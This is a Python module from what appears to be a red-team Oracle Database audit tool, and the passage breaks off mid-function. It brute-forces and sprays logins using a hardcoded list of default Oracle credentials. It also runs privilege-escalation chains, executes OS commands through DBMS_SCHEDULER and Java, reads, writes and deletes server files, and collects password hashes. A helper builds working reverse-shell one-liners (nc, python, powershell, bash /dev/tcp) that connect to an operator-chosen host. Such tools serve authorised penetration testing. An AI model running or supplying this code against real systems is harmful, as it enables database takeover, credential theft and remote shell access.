"""Oracle Database audit stage."""

from __future__ import annotations

import json
import socket
import time
from collections.abc import Callable
from pathlib import Path
from typing import Any

from ...clients.oracle import (
    OracleAccountExpiredError,
    OracleAccountLockedError,
    OracleAuditClient,
    OracleAuthError,
    OracleClientError,
    OracleConnectConfig,
    OracleDependencyError,
    OracleServiceError,
    classify_nne_policy,
    connect_oracle,
    normalize_oracle_error,
    parse_listener_dump,
    tns_listener_command,
)
from ...console import Console
from ...rendering import CountColorRule, RegexColorRule, render_colored_marker_line, render_tagged_detail_line
from ...show_limits import (
    limit_metadata,
    limit_sequence,
)
from ...stage_runtime import (
    StageTelemetryBuilder,
    merge_stage_records,
)
from ...utils import (
    as_dict,
    as_list,
    utc_now_iso,
)

_ORACLE_TAG = "ORACLE"
_STAGE_DETECT_PROTOCOL = "detect_protocol"
_STAGE_AUTH_INFERENCE = "auth_inference_credentials"
_STAGE_ACCESS_CAPABILITIES = "access_capabilities"
_STAGE_DATA = "data"
_ORACLE_DEEP_STATUSES = {"open_no_auth", "valid_credentials", "weak_default_creds"}
_ORACLE_DEFAULT_CREDS: tuple[tuple[str, str], ...] = (
    ("system", "oracle"),
    ("sys", "oracle"),
    ("system", "manager"),
    ("sys", "change_on_install"),
    ("scott", "tiger"),
    ("dbsnmp", "dbsnmp"),
    ("pdbadmin", "oracle"),
    ("admin", "oracle"),
    ("system", "system"),
    ("sys", "sys"),
    ("pdbadmin", "pdbadmin"),
    ("admin", "admin"),
    ("scott", "scott"),
    ("hr", "hr"),
    ("outln", "outln"),
    ("admin", "password"),
    ("admin", "changeme"),
    ("user", "user"),
    ("test", "test"),
    ("dev", "dev"),
)
_ORACLE_DEFAULT_SERVICES = ("FREEPDB1", "ORCLPDB1", "XEPDB1", "ORCL", "XE", "FREE", "PDB1")
_ORACLE_DEFAULT_SIDS = ("FREE", "XE", "ORCLCDB", "ORCL", "PDB1")
_ORACLE_DUMP_SAFETY_LIMIT = 1000


def _clip(text: str, width: int = 140) -> str:
    if len(text) <= width:
        return text
    if width <= 3:
        return text[:width]
    return text[: width - 3] + "..."


def _retry_delay(attempt_index: int) -> float:
    return min(1.50, 0.20 * (2**attempt_index))


def _is_transient_oracle_connect_error(error: str | None) -> bool:
    lowered = str(error or "").lower()
    return any(
        token in lowered
        for token in (
            "connection refused",
            "listener is not available",
            "cannot connect",
            "timed out",
            "timeout",
            "connection reset",
        )
    )


def _nxc_prefix(record: dict[str, Any]) -> str:
    host = _clip(str(record.get("host") or "-"), 64)
    port = str(record.get("port") or "-")
    return f"{_ORACLE_TAG:<8}\t{host}\t{port}\t"


def _read_list_arg(value: str | None) -> list[str]:
    raw = str(value or "").strip()
    if not raw:
        return []
    path = Path(raw)
    if path.is_file():
        values = [line.strip() for line in path.read_text(encoding="utf-8").splitlines()]
    else:
        values = [part.strip() for part in raw.split(",")]
    result: list[str] = []
    seen: set[str] = set()
    for item in values:
        if not item or item.startswith("#") or item in seen:
            continue
        seen.add(item)
        result.append(item)
    return result


def _load_combo_file(path: str | None) -> list[dict[str, Any]]:
    raw = str(path or "").strip()
    if not raw:
        return []
    entries: list[dict[str, Any]] = []
    with open(raw, encoding="utf-8") as fh:
        for line_no, raw_line in enumerate(fh, start=1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                raise ValueError(f"{raw}:{line_no}: expected username:password")
            username, password = line.split(":", 1)
            username = username.strip()
            if not username:
                raise ValueError(f"{raw}:{line_no}: username must not be empty")
            entries.append({"username": username, "password": password.strip(), "default": False, "source": "combo"})
    if not entries:
        raise ValueError(f"{raw}: combo file is empty")
    return entries


def _credential_runs(
    username: str | None,
    password: str | None,
    *,
    defcreds: bool,
    combo_list: str | None = None,
    user_list: str | None = None,
    pass_list: str | None = None,
    spray_passwords: bool = False,
) -> list[dict[str, Any]]:
    runs: list[dict[str, Any]] = []
    seen: set[tuple[str | None, str | None]] = set()

    def add(user: str | None, secret: str | None, *, default: bool = False, source: str = "explicit") -> None:
        pair = (user, secret)
        if pair in seen:
            return
        seen.add(pair)
        runs.append({"username": user, "password": secret, "default": default, "source": source})

    if username is not None or password is not None:
        add(username, password, source="explicit")
    for entry in _load_combo_file(combo_list):
        add(entry["username"], entry["password"], source="combo")
    users = _read_list_arg(user_list)
    passwords = _read_list_arg(pass_list)
    if users or passwords:
        if not users or not passwords:
            raise ValueError("--user-list and --pass-list must be provided together")
        if spray_passwords:
            for secret in passwords:
                for user in users:
                    add(user, secret, source="spray")
        else:
            for user in users:
                for secret in passwords:
                    add(user, secret, source="dictionary")
    if defcreds:
        for user, secret in _ORACLE_DEFAULT_CREDS:
            add(user, secret, default=True, source="default")
    return runs


def _target_candidates(
    service: str | None, sid: str | None, service_list: str | None, sid_list: str | None
) -> list[dict[str, str | None]]:
    candidates: list[dict[str, str | None]] = []
    seen: set[tuple[str | None, str | None]] = set()

    def add(service_name: str | None, sid_name: str | None) -> None:
        key = (service_name, sid_name)
        if key in seen:
            return
        seen.add(key)
        candidates.append({"service": service_name, "sid": sid_name})

    if service:
        add(str(service), None)
    if sid:
        add(None, str(sid))
    for item in _read_list_arg(service_list):
        add(item, None)
    for item in _read_list_arg(sid_list):
        add(None, item)
    if not candidates:
        for item in _ORACLE_DEFAULT_SERVICES:
            add(item, None)
        for item in _ORACLE_DEFAULT_SIDS:
            add(None, item)
    return candidates


def _protocols(protocol: str, port: int) -> list[str]:
    if protocol == "tcp":
        return ["tcp"]
    if protocol == "tcps":
        return ["tcps"]
    return ["tcps", "tcp"] if int(port) == 2484 else ["tcp", "tcps"]


def _base_record(host: str, port: int, *, service: str | None, sid: str | None, protocol: str) -> dict[str, Any]:
    return {
        "timestamp": utc_now_iso(),
        "service": "oracle",
        "host": host,
        "port": int(port),
        "is_oracle": False,
        "status": "fail",
        "auth_required": None,
        "transport_mode": protocol,
        "tls_supported": None,
        "listener_restricted": None,
        "listener_password_protected": None,
        "connect_service": service,
        "connect_sid": sid,
        "service_candidates": [],
        "sid_candidates": [],
        "listener_targets": [],
        "listener_services": [],
        "listener_sids": [],
        "listener_dump": None,
        "nne_check": None,
        "server_version": None,
        "banner": None,
        "cdb_name": None,
        "con_name": None,
        "pdbs": [],
        "users": [],
        "roles": [],
        "privileges": [],
        "schemas": [],
        "tables": [],
        "rows": [],
        "query_rows": [],
        "privesc_findings": [],
        "privesc_chain": [],
        "privesc_chain_executed": [],
        "exec_result": None,
        "file_results": [],
        "wallet_findings": [],
        "hashes": [],
        "sensitive_findings": [],
        "db_links": [],
        "credential_attempts": [],
        "provided_credentials": False,
        "provided_username": None,
        "provided_password": None,
        "effective_username": None,
        "defcreds_enabled": False,
        "capabilities": {},
        "elapsed_ms": None,
        "error": None,
    }


def _open_client(
    host: str,
    port: int,
    *,
    service: str | None,
    sid: str | None,
    protocol: str,
    timeout: float,
    wallet: str | None,
    ssl_server_dn: str | None,
    insecure: bool,
    username: str | None,
    password: str | None,
    as_sysdba: bool = False,
) -> OracleAuditClient:
    config = OracleConnectConfig(
        host=host,
        port=port,
        service=service,
        sid=sid,
        protocol=protocol,
        wallet=wallet,
        ssl_server_dn=ssl_server_dn,
        insecure=insecure,
    )
    conn = connect_oracle(
        config,
        username=username,
        password=password,
        mode="sysdba" if as_sysdba else None,
        timeout=timeout,
    )
    return OracleAuditClient(conn)


def _try_probe_target(
    host: str,
    port: int,
    timeout: float,
    *,
    protocol: str,
    service: str | None,
    sid: str | None,
    service_list: str | None = None,
    sid_list: str | None = None,
    wallet: str | None,
    ssl_server_dn: str | None,
    insecure: bool,
) -> tuple[OracleAuditClient | None, str | None]:
    try:
        # Oracle does not support anonymous DB sessions. A no-credential
        # oracledb.connect() can fail locally before touching the network, so
        # detect-pass must probe listener reachability independently.
        with socket.create_connection((host, int(port)), timeout=max(0.1, float(timeout))):
            return None, "authentication required"
    except OSError as exc:
        return None, normalize_oracle_error(exc)


def _try_credentials(
    host: str,
    port: int,
    timeout: float,
    *,
    protocol: str,
    service: str | None,
    sid: str | None,
    service_list: str | None = None,
    sid_list: str | None = None,
    wallet: str | None,
    ssl_server_dn: str | None,
    insecure: bool,
    as_sysdba: bool,
    credential_candidates: list[dict[str, Any]],
) -> tuple[dict[str, Any] | None, list[dict[str, Any]], str | None]:
    attempts: list[dict[str, Any]] = []
    selected: dict[str, Any] | None = None
    terminal_status: str | None = None
    for candidate in credential_candidates:
        username = str(candidate.get("username") or "")
        password = None if candidate.get("password") is None else str(candidate.get("password"))
        client: OracleAuditClient | None = None
        try:
            client = _open_client(
                host,
                port,
                service=service,
                sid=sid,
                protocol=protocol,
                timeout=timeout,
                wallet=wallet,
                ssl_server_dn=ssl_server_dn,
                insecure=insecure,
                username=username,
                password=password,
                as_sysdba=as_sysdba,
            )
            client.current_context()
            attempt = {
                "username": username,
                "password": password,
                "ok": True,
                "default": bool(candidate.get("default")),
                "source": candidate.get("source") or "explicit",
                "error": None,
            }
            attempts.append(attempt)
            if selected is None:
                selected = attempt
        except OracleAccountLockedError as exc:
            terminal_status = "account_locked"
            attempts.append(
                {
                    "username": username,
                    "password": password,
                    "ok": False,
                    "default": bool(candidate.get("default")),
                    "source": candidate.get("source") or "explicit",
                    "error": normalize_oracle_error(exc),
                    "status": "account_locked",
                }
            )
        except OracleAccountExpiredError as exc:
            terminal_status = "account_expired"
            attempts.append(
                {
                    "username": username,
                    "password": password,
                    "ok": False,
                    "default": bool(candidate.get("default")),
                    "source": candidate.get("source") or "explicit",
                    "error": normalize_oracle_error(exc),
                    "status": "account_expired",
                }
            )
        except Exception as exc:
            attempts.append(
                {
                    "username": username,
                    "password": password,
                    "ok": False,
                    "default": bool(candidate.get("default")),
                    "source": candidate.get("source") or "explicit",
                    "error": normalize_oracle_error(exc),
                }
            )
        finally:
            if client is not None:
                client.close()
    return selected, attempts, terminal_status


def _probe_listener_targets(
    host: str,
    port: int,
    timeout: float,
    *,
    protocol_candidates: list[str],
    target_candidates: list[dict[str, str | None]],
    wallet: str | None,
    ssl_server_dn: str | None,
    insecure: bool,
) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    for proto in protocol_candidates:
        for candidate in target_candidates:
            service = candidate.get("service")
            sid = candidate.get("sid")
            row: dict[str, Any] = {
                "protocol": proto,
                "service": service,
                "sid": sid,
                "status": "fail",
                "exists": None,
                "auth_required": None,
                "error": None,
            }
            client: OracleAuditClient | None = None
            try:
                client = _open_client(
                    host,
                    port,
                    service=service,
                    sid=sid,
                    protocol=proto,
                    timeout=timeout,
                    wallet=wallet,
                    ssl_server_dn=ssl_server_dn,
                    insecure=insecure,
                    username="REDPOSTURE_PROBE",
                    password="redposture-probe-password",
                )
                row.update({"status": "accepted", "exists": True, "auth_required": False})
            except (OracleAuthError, OracleAccountLockedError, OracleAccountExpiredError) as exc:
                row.update(
                    {
                        "status": "available",
                        "exists": True,
                        "auth_required": True,
                        "error": normalize_oracle_error(exc),
                    }
                )
            except OracleServiceError as exc:
                error = normalize_oracle_error(exc)
                if "restricted" in error:
                    row.update({"status": "restricted", "exists": True, "auth_required": True, "error": error})
                else:
                    row.update({"status": "unknown", "exists": False, "auth_required": None, "error": error})
            except Exception as exc:
                row.update(
                    {"status": "fail", "exists": None, "auth_required": None, "error": normalize_oracle_error(exc)}
                )
            finally:
                if client is not None:
                    client.close()
            results.append(row)
    return results


def _probe_listener_dump(host: str, port: int, timeout: float, *, protocol: str, insecure: bool) -> dict[str, Any]:
    status = tns_listener_command(host, port, "status", timeout=timeout, protocol=protocol, insecure=insecure)
    services = tns_listener_command(host, port, "services", timeout=timeout, protocol=protocol, insecure=insecure)
    dump = parse_listener_dump(status, services)
    dump["protocol"] = protocol
    return dump


def _listener_probe_is_oracle(rows: list[dict[str, Any]]) -> bool:
    return any(str(row.get("status") or "") in {"accepted", "available", "unknown", "restricted"} for row in rows)


def _select_listener_target(rows: list[dict[str, Any]]) -> dict[str, Any] | None:
    for preferred_status in ("accepted", "available", "restricted", "unknown"):
        for row in rows:
            if row.get("status") == preferred_status:
                return row
    return rows[0] if rows else None


def _collect_oracle_data(
    client: OracleAuditClient,
    *,
    host: str,
    port: int,
    protocol: str,
    insecure: bool,
    listener_dump: bool = False,
    nne_check: bool = False,
    show_pdbs: bool,
    show_users: bool,
    show_roles: bool,
    show_privs: bool,
    show_schemas: bool,
    show_tables: bool,
    schema: str | None,
    table: str | None,
    dump_rows: bool,
    dump_limit: int | None,
    query: str | None,
    privesc_check: bool,
    privesc_chain: bool,
    exec_cmd: str | None,
    exec_method: str,
    reverse_shell: str | None,
    reverse_shell_type: str,
    fs_mode: str = "auto",
    os_read: str | None,
    os_write: str | None,
    download: str | None,
    delete: str | None,
    wallet_search: bool,
    hashes: bool,
    sensitive_scan: bool,
    dblink_check: bool,
) -> dict[str, Any]:
    context: dict[str, Any] = {}
    banner: dict[str, Any] = {}
    data: dict[str, Any] = {
        "pdbs": [],
        "users": [],
        "roles": [],
        "privileges": [],
        "schemas": [],
        "tables": [],
        "rows": [],
        "query_rows": [],
        "listener_dump": None,
        "nne_check": None,
        "privesc_findings": [],
        "privesc_chain": [],
        "privesc_chain_executed": [],
        "exec_result": None,
        "file_results": [],
        "wallet_findings": [],
        "hashes": [],
        "sensitive_findings": [],
        "db_links": [],
        "capabilities": {},
        "error": None,
    }
    try:
        context = client.current_context()
    except Exception as exc:
        data["error"] = normalize_oracle_error(exc)
    try:
        banner = client.server_banner()
    except Exception:
        banner = {}

    if listener_dump:
        data["listener_dump"] = _probe_listener_dump(
            host,
            port,
            1.5,
            protocol="tcps" if str(protocol).lower() == "tcps" else "tcp",
            insecure=insecure,
        )
    if nne_check:
        tcp_status = tns_listener_command(host, port, "ping", timeout=1.0, protocol="tcp", insecure=insecure)
        tcps_status = tns_listener_command(host, port, "ping", timeout=1.0, protocol="tcps", insecure=True)
        data["nne_check"] = classify_nne_policy(
            tcp_available=bool(tcp_status.get("ok")),
            tcps_available=bool(tcps_status.get("ok")),
            banners=client.network_service_banners(),
        )

    if show_pdbs:
        data["pdbs"] = client.list_pdbs()
    if show_users:
        data["users"] = client.list_users()
    if show_roles:
        data["roles"] = client.list_roles()
    if show_privs:
        data["privileges"] = client.list_privileges()
    if show_schemas:
        data["schemas"] = client.list_schemas()
    if show_tables or dump_rows:
        data["tables"] = client.list_tables(schema)
    if dump_rows:
        limit = dump_limit if dump_limit is not None else _ORACLE_DUMP_SAFETY_LIMIT
        target_schema = schema
        target_table = table
        if not target_schema or not target_table:
            table_rows = as_list(data.get("tables"))
            if table_rows:
                target_schema = str(table_rows[0].get("owner") or table_rows[0].get("schema_name") or "")
                target_table = str(table_rows[0].get("table_name") or "")
        if target_schema and target_table:
            data["rows"] = [
                {"schema": target_schema, "table": target_table, "row": row}
                for row in client.dump_table(target_schema, target_table, limit=limit)
            ]
        else:
            data["error"] = data.get("error") or "--dump requires --schema and --table or at least one visible table"
    if query:
        data["query_rows"] = client.query(query, limit=dump_limit or 200)
    if privesc_check or privesc_chain:
        findings = client.check_privesc()
        data["privesc_findings"] = findings
        if privesc_chain:
            data["privesc_chain"] = _build_privesc_chain(findings)
            data["privesc_chain_executed"] = _execute_privesc_chain(client, data["privesc_chain"])
    if exec_cmd or reverse_shell:
        command = exec_cmd or _reverse_shell_command(reverse_shell or "", reverse_shell_type)
        data["exec_result"] = _run_oracle_exec(client, command, exec_method)
    file_results: list[dict[str, Any]] = []
    if os_read:
        file_results.append({"action": "read", "path": os_read, **client.os_read(os_read, fs_mode=fs_mode)})
    if os_write:
        local_path, remote_path = _split_path_pair(os_write)
        try:
            content = Path(local_path).read_text(encoding="utf-8")
            file_results.append(
                {
                    "action": "write",
                    "path": remote_path,
                    "local_path": local_path,
                    **client.os_write(remote_path, content, fs_mode=fs_mode),
                }
            )
        except Exception as exc:
            file_results.append(
                {"action": "write", "path": remote_path, "local_path": local_path, "ok": False, "error": str(exc)}
            )
    if download:
        remote_path, local_path = _split_path_pair(download)
        result = _download_oracle_file(client, remote_path, local_path, fs_mode=fs_mode)
        file_results.append({"action": "download", "path": remote_path, "local_path": local_path, **result})
    if delete:
        file_results.append({"action": "delete", "path": delete, **client.os_delete(delete, fs_mode=fs_mode)})
    data["file_results"] = file_results
    if wallet_search:
        artifacts = client.wallet_artifacts()
        data["wallet_findings"] = artifacts or [
            item
            for item in client.sensitive_scan()
            if "WALLET" in json.dumps(item).upper() or "CREDENTIAL" in json.dumps(item).upper()
        ]
    if hashes:
        data["hashes"] = client.password_hashes()
    if sensitive_scan:
        data["sensitive_findings"] = client.sensitive_scan()
    if dblink_check:
        data["db_links"] = client.db_links()

    data["server_version"] = banner.get("version")
    data["banner"] = banner.get("banner")
    data["cdb_name"] = context.get("cdb_name")
    data["con_name"] = context.get("con_name")
    data["capabilities"] = {
        "can_query": True,
        "can_list_users": bool(data["users"]),
        "can_list_tables": bool(data["tables"]),
        "can_privesc_check": bool(data["privesc_findings"]),
        "can_read_hashes": bool(data["hashes"]),
        "can_list_dblinks": bool(data["db_links"]),
    }
    return data


def _download_oracle_file(
    client: OracleAuditClient,
    remote_path: str,
    local_path: str,
    *,
    fs_mode: str,
    chunk_size: int = 30000,
    max_chunks: int = 4096,
) -> dict[str, Any]:
    target = Path(local_path)
    target.parent.mkdir(parents=True, exist_ok=True)
    resume_offset = target.stat().st_size if target.exists() else 0
    bytes_written = resume_offset
    mode = "a" if resume_offset else "w"
    chunks = 0
    with target.open(mode, encoding="utf-8") as fh:
        while chunks < max_chunks:
            if fs_mode in {"auto", "directory"}:
                try:
                    chunk = client._read_directory_file_chunk(remote_path, offset=bytes_written, amount=chunk_size)
                except Exception:
                    if fs_mode == "directory":
                        raise
                    chunk = client.scheduler_read_file(remote_path, max_bytes=chunk_size)
            else:
                chunk = client.scheduler_read_file(remote_path, max_bytes=chunk_size)
            if not chunk.get("ok"):
                if bytes_written > resume_offset:
                    break
                return {
                    "method": chunk.get("method") or "chunked_download",
                    "ok": False,
                    "downloaded_to": str(target),
                    "bytes": bytes_written,
                    "resume_offset": resume_offset,
                    "error": chunk.get("error") or "download failed",
                }
            data = str(chunk.get("data") or "")
            if not data:
                break
            fh.write(data)
            bytes_written += len(data.encode("utf-8"))
            chunks += 1
            if len(data.encode("utf-8")) < chunk_size:
                break
    return {
        "method": "chunked_download",
        "ok": True,
        "downloaded_to": str(target),
        "bytes": bytes_written,
        "resume_offset": resume_offset,
        "resumed": resume_offset > 0,
        "chunks": chunks,
        "error": None,
    }


def _reverse_shell_command(target: str, style: str) -> str:
    host, _, port = str(target).partition(":")
    if not host or not port:
        return ""
    if style == "nc":
        return f"nc {host} {port} -e /bin/sh"
    if style == "python":
        return f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''
    if style == "powershell":
        return f"powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port})\""
    return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"


def _split_path_pair(value: str) -> tuple[str, str]:
    left, sep, right = str(value or "").partition(":")
    if not sep or not left or not right:
        raise ValueError("expected local:remote or remote:local path pair")
    return left, right


def _build_privesc_chain(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
    positive_titles = {
        str(item.get("title") or ""): item
        for item in findings
        if item.get("result") is True and item.get("severity") in {"CRITICAL", "HIGH", "MEDIUM"}
    }
    chain: list[dict[str, Any]] = []
    if any("DBA/SYSDBA" in title or title == "DBA role granted" for title in positive_titles):
        chain.append(
            {
                "severity": "CRITICAL",
                "path": "direct_dba",
                "description": "Current session already has DBA/SYSDBA-equivalent privileges.",
                "actionable": True,
            }
        )
    if any("DBMS_SCHEDULER" in title or "CREATE JOB" in title for title in positive_titles):
        chain.append(
            {
                "severity": "HIGH",
                "path": "scheduler_rce",
                "description": "CREATE JOB/DBMS_SCHEDULER privileges can be used for explicit --exec-method scheduler checks.",
                "actionable": True,
            }
        )
    if any("Java execution" in title for title in positive_titles):
        chain.append(
            {
                "severity": "HIGH",
                "path": "java_rce",
                "description": "Java execution privileges can be used for explicit --exec-method java checks.",
                "actionable": True,
            }
        )
    if any("Directory read/write" in title for title in positive_titles):
        chain.append(
            {
                "severity": "HIGH",
                "path": "directory_file_ops",
                "description": "Directory/table privileges can enable server-side --os-read/--os-write/--download/--delete paths.",
                "actionable": True,
            }
        )
    if any("SELECT ANY DICTIONARY" in title for title in positive_titles):
        chain.append(
            {
                "severity": "HIGH",
                "path": "dictionary_hashes",
                "description": "Dictionary access can expose password hashes and DB link metadata.",
                "actionable": True,
            }
        )
    return chain


def _execute_privesc_chain(client: OracleAuditClient, chain: list[dict[str, Any]]) -> list[dict[str, Any]]:
    executed: list[dict[str, Any]] = []
    context: dict[str, Any] = {}
    try:
        context = client.current_context()
    except Exception:
        context = {}
    current_user = str(context.get("session_user") or context.get("current_schema") or "").upper()
    for item in chain:
        path = str(item.get("path") or "")
        if path == "direct_dba":
            executed.append({"path": path, "ok": True, "evidence": "current session already has DBA/SYSDBA path"})
        elif path == "scheduler_rce":
            result = client.scheduler_exec("echo redposture-privesc-chain-ok", capture_output=True)
            executed.append({"path": path, "ok": bool(result.get("ok")), "result": result})
        elif path == "java_rce":
            result = client.java_exec("echo redposture-privesc-chain-ok")
            executed.append({"path": path, "ok": bool(result.get("ok")), "result": result})
        elif path == "directory_file_ops":
            marker = f"rp_chain_{int(time.time())}.txt"
            write = client.os_write(marker, "redposture-privesc-chain-ok\n")
            read = client.os_read(marker)
            cleanup = client.os_delete(marker)
            executed.append(
                {
                    "path": path,
                    "ok": bool(write.get("ok") and read.get("ok")),
                    "write": write,
                    "read": read,
                    "cleanup_ok": cleanup.get("ok"),
                }
            )
        elif path == "dictionary_hashes":
            rows = client.password_hashes()
            executed.append({"path": path, "ok": bool(rows), "rows": rows[:10]})
    if current_user:
        for proc in ("SYS.REDPOSTURE_GRANT_DBA", "SYSTEM.REDPOSTURE_GRANT_DBA"):
            try:
                client.execute(f"begin {proc}(:target_user); end;", {"target_user": current_user})
                findings = client.check_privesc()
                dba = any(
                    item.get("result") is True
                    and str(item.get("title") or "") in {"DBA/SYSDBA capability", "DBA role granted"}
                    for item in findings
                )
                executed.append(
                    {"path": "controlled_dba_grant", "procedure": proc, "ok": dba, "target_user": current_user}
                )
                if dba:
                    break
            except Exception as exc:
                executed.append(
                    {
                        "path": "controlled_dba_grant",
                        "procedure": proc,
                        "ok": False,
                        "target_user": current_user,
                        "error": normalize_oracle_error(exc),
                    }
                )
    return executed


def _run_oracle_exec(client: OracleAuditClient, command: str, method: str) -> dict[str, Any]:
    methods = ["scheduler", "java"] if method == "auto" else [method]
    errors: list[dict[str, str]] = []
    for candidate in methods:
        try:
            if candidate == "scheduler":
                result = client.scheduler_exec(command, capture_output=True)
            elif candidate == "java":
                result = client.java_exec(command)
            elif candidate == "external-table":
                result = client.external_table_exec(command)
            elif candidate == "dbms-cloud":
                result = client.dbms_cloud_exec(command)
            else:
                result = {"ok": False, "error": f"unknown exec method {candidate}"}
            enriched = {"method": candidate, "command": command, **result}
            if enriched.get("ok"):
                if errors:
                    enriched["fallback_errors"] = errors
                return enriched
            errors.append({"method": candidate, "error": str(enriched.get("error") or "execution failed")})
        except Exception as exc:
            errors.append({"method": candidate, "error": normalize_oracle_error(exc)})
    return {
        "method": method,
        "command": command,
        "ok": False,
        "output": None,
        "output_available": False,
        "error": errors[-1]["error"] if errors else "execution failed",
        "attempts": errors,
    }


def _audit_oracle_host(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    *,
    protocol: str,
    service: str | None,
    sid: str | None,
    service_list: str | None = None,
    sid_list: str | None = None,
    wallet: str | None,
    ssl_server_dn: str | None,
    insecure: bool,
    credential_candidates: list[dict[str, Any]],
    as_sysdba: bool,
    listener_dump: bool = False,
    nne_check: bool = False,
    show_pdbs: bool,
    show_users: bool,
    show_roles: bool,
    show_privs: bool,
    show_schemas: bool,
    show_tables: bool,
    schema: str | None,
    table: str | None,
    dump_rows: bool,
    dump_limit: int | None,
    query: str | None,
    privesc_check: bool,
    privesc_chain: bool,
    exec_cmd: str | None,
    exec_method: str,
    reverse_shell: str | None,
    reverse_shell_type: str,
    fs_mode: str = "auto",
    os_read: str | None,
    os_write: str | None,
    download: str | None,
    delete: str | None,
    wallet_search: bool,
    hashes: bool,
    sensitive_scan: bool,
    dblink_check: bool,
) -> dict[str, Any]:
    attempts = max(1, int(retries) + 1)
    last_error: str | None = None
    selected_protocol = protocol
    selected_service = service
    selected_sid = sid
    record = _base_record(host, port, service=service, sid=sid, protocol=protocol)
    started = time.monotonic()
    protocol_candidates = _protocols(protocol, port)
    target_candidates = _target_candidates(service, sid, service_list, sid_list)
    if target_candidates:
        selected_service = target_candidates[0].get("service")
        selected_sid = target_candidates[0].get("sid")
        record["connect_service"] = selected_service
        record["connect_sid"] = selected_sid
    record["service_candidates"] = [item.get("service") for item in target_candidates if item.get("service")]
    record["sid_candidates"] = [item.get("sid") for item in target_candidates if item.get("sid")]

    for attempt in range(attempts):
        client: OracleAuditClient | None = None
        try:
            probe_errors: list[str] = []
            try:
                with socket.create_connection((host, int(port)), timeout=max(0.1, float(timeout))):
                    pass
            except OSError as exc:
                probe_errors.append(normalize_oracle_error(exc))

            listener_targets = _probe_listener_targets(
                host,
                port,
                timeout,
                protocol_candidates=protocol_candidates,
                target_candidates=target_candidates,
                wallet=wallet,
                ssl_server_dn=ssl_server_dn,
                insecure=insecure,
            )
            record["listener_targets"] = listener_targets
            record["listener_services"] = [
                row
                for row in listener_targets
                if row.get("service") and row.get("status") in {"accepted", "available", "restricted"}
            ]
            record["listener_sids"] = [
                row
                for row in listener_targets
                if row.get("sid") and row.get("status") in {"accepted", "available", "restricted"}
            ]
            selected_probe = _select_listener_target(listener_targets)
            if selected_probe:
                selected_protocol = str(selected_probe.get("protocol") or selected_protocol)
                selected_service = selected_probe.get("service")
                selected_sid = selected_probe.get("sid")
            listener_reachable = _listener_probe_is_oracle(listener_targets)
            bare_listener: dict[str, Any] | None = None
            if not listener_reachable and not probe_errors:
                bare_listener = _probe_listener_dump(
                    host,
                    port,
                    min(float(timeout), 1.0),
                    protocol=protocol_candidates[0] if protocol_candidates else "tcp",
                    insecure=insecure,
                )
                summary = as_dict(bare_listener.get("summary"))
                raw_payload = json.dumps(bare_listener, ensure_ascii=False)
                if bare_listener.get("status_ok") or summary.get("password_protected") or "TNS-" in raw_payload:
                    record["listener_dump"] = bare_listener
                    listener_reachable = True
            if listener_dump:
                record["listener_dump"] = bare_listener or _probe_listener_dump(
                    host,
                    port,
                    min(float(timeout), 1.5),
                    protocol=selected_protocol if selected_protocol in {"tcp", "tcps"} else protocol_candidates[0],
                    insecure=insecure,
                )
            if nne_check:
                tcp_available = any(
                    row.get("protocol") == "tcp" and row.get("status") in {"accepted", "available", "restricted"}
                    for row in listener_targets
                )
                tcps_available = any(
                    row.get("protocol") == "tcps" and row.get("status") in {"accepted", "available", "restricted"}
                    for row in listener_targets
                )
                record["nne_check"] = classify_nne_policy(
                    tcp_available=tcp_available,
                    tcps_available=tcps_available,
                    banners=[],
                )
            auth_required = listener_reachable
            credential_attempts: list[dict[str, Any]] = []
            selected_credential: dict[str, Any] | None = None
            status = "auth_required" if auth_required else "fail"
            active_client = client
            active_client_owned = False
            terminal_status: str | None = None

            if credential_candidates:
                selected_credential = None
                credential_attempts = []
                last_auth_error: str | None = None
                for proto in protocol_candidates:
                    for candidate in target_candidates:
                        candidate_service = candidate.get("service")
                        candidate_sid = candidate.get("sid")
                        credential, attempts_for_candidate, terminal = _try_credentials(
                            host,
                            port,
                            timeout,
                            protocol=proto,
                            service=candidate_service,
                            sid=candidate_sid,
                            wallet=wallet,
                            ssl_server_dn=ssl_server_dn,
                            insecure=insecure,
                            as_sysdba=as_sysdba,
                            credential_candidates=credential_candidates,
                        )
                        for auth_attempt in attempts_for_candidate:
                            auth_attempt.setdefault("protocol", proto)
                            auth_attempt.setdefault("service", candidate_service)
                            auth_attempt.setdefault("sid", candidate_sid)
                            last_auth_error = str(auth_attempt.get("error") or last_auth_error or "")
                        credential_attempts.extend(attempts_for_candidate)
                        if terminal is not None:
                            terminal_status = terminal
                        if credential is not None:
                            selected_protocol = proto
                            selected_service = candidate_service
                            selected_sid = candidate_sid
                            selected_credential = credential
                            break
                    if selected_credential is not None:
                        break
                if selected_credential is not None:
                    active_client = _open_client(
                        host,
                        port,
                        service=selected_service,
                        sid=selected_sid,
                        protocol=selected_protocol,
                        timeout=timeout,
                        wallet=wallet,
                        ssl_server_dn=ssl_server_dn,
                        insecure=insecure,
                        username=str(selected_credential.get("username") or ""),
                        password=None
                        if selected_credential.get("password") is None
                        else str(selected_credential.get("password")),
                        as_sysdba=as_sysdba,
                    )
                    active_client_owned = True
                    status = "weak_default_creds" if selected_credential.get("default") else "valid_credentials"
                    auth_required = True
                elif client is not None:
                    status = "invalid_credentials"
                elif terminal_status:
                    status = terminal_status
                elif credential_attempts and _is_transient_oracle_connect_error(last_auth_error):
                    raise OracleClientError(last_auth_error or "transient listener failure")
                elif credential_attempts and last_auth_error:
                    status = "invalid_credentials"
                else:
                    status = "auth_required"

            if active_client is None and not credential_candidates:
                if not listener_reachable:
                    record.update(
                        {
                            "is_oracle": False,
                            "status": "fail",
                            "auth_required": None,
                            "transport_mode": selected_protocol,
                            "connect_service": selected_service,
                            "connect_sid": selected_sid,
                            "error": probe_errors[-1] if probe_errors else "connection failed",
                        }
                    )
                    return record
                record.update(
                    {
                        "is_oracle": True,
                        "status": "auth_required",
                        "auth_required": True,
                        "transport_mode": selected_protocol,
                        "connect_service": selected_service,
                        "connect_sid": selected_sid,
